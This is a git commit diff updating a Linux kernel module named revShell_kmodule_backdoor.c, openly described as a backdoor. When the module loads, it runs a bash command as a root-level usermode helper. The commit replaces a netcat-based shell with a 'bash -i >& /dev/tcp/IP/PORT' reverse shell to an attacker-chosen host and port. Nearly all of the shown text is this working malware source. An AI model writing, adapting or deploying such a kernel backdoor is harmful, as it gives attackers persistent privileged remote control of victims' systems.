1b3ae8ae3be1e6bd97c05640e7d24a0b4f875a1c
CJHackerz <cjhackerz443@protonmail.com>
2023-11-21 08:27:50 +0530

    v1.1 - Hotfix for 2023
    Implmented suggestions from @TotallyNotAHaxxer

--- revShell_kmodule_backdoor.c
+++ revShell_kmodule_backdoor.c
@@ -2,7 +2,7 @@
 #include <linux/module.h>
 #include <linux/kmod.h>
 
-MODULE_LICENSE("GPL v3");
+MODULE_LICENSE("GPL");
 MODULE_AUTHOR("CJHackerz");
 MODULE_DESCRIPTION("This module pwns your system!");
 
@@ -14,35 +14,30 @@ static char *lhost_port = "4444";
 module_param(lhost_port, charp, 0);
 MODULE_PARM_DESC(lhost_port, "listening PORT for reverse shell connection");
 
-static int exec_command(char *bash_command){
-	char *argv[] = { "/bin/bash", "-c", bash_command, NULL};
-	static char *env[] = {
-		"HOME=/",
-		"TERM=linux",
-		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+static int exec_command(char *bash_command) {
+    char *argv[] = { "/bin/bash", "-c", bash_command, NULL };
+    static char *env[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
+    };
 
-	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
 }
 
 static int __init start_backdoor(void) {
-	unsigned const char *bash_command_parts[2] = {" ", " -e '/bin/sh'' &"};
-	char bash_command[47] = "bash -c 'nc ";
+    char bash_command[100];
+    snprintf(bash_command, sizeof(bash_command), "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", lhost_ip, lhost_port);
 
-	strcat(bash_command, lhost_ip);
-	strcat(bash_command, bash_command_parts[0]);
-	strcat(bash_command, lhost_port);
-	strcat(bash_command, bash_command_parts[1]);
+    pr_info("Connecting shell on IP: %s and PORT: %s", lhost_ip, lhost_port);
+    pr_info("Executing command sequence: %s", bash_command);
+    exec_command(bash_command);
 
-	pr_info("======== Pwning System ========");
-	pr_info("Connecting shell on IP: %s and PORT: %s", lhost_ip, lhost_port);
-	pr_info("Executing command sequence: %s", bash_command);
-	exec_command(bash_command);
-	
-	return 0;
+    return 0;
 }
 
 static void __exit stop_backdoor(void) {
-	pr_info("===============================\n");
+    pr_info("===============================\n");
 }
 
 module_init(start_backdoor);
